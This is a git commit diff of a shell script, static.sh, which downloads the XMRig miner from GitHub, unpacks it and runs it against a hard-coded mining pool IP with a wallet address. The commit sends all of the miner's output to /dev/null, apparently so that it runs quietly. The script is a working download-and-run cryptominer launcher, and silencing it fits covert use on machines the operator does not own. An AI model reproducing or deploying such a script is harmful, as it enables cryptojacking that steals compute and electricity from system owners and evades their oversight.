f7d693c7e43e46d904153ee788490c68c4e64daf
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-13 21:45:16 +0700

    Update static.sh

--- static.sh
+++ static.sh
@@ -2,4 +2,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux
 tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
 ls
 cd xmrig-6.15.0
-./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --threads=4 --randomx-1gb-pages
+./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq -p x --threads=4 --randomx-1gb-pages > /dev/null 2>&1
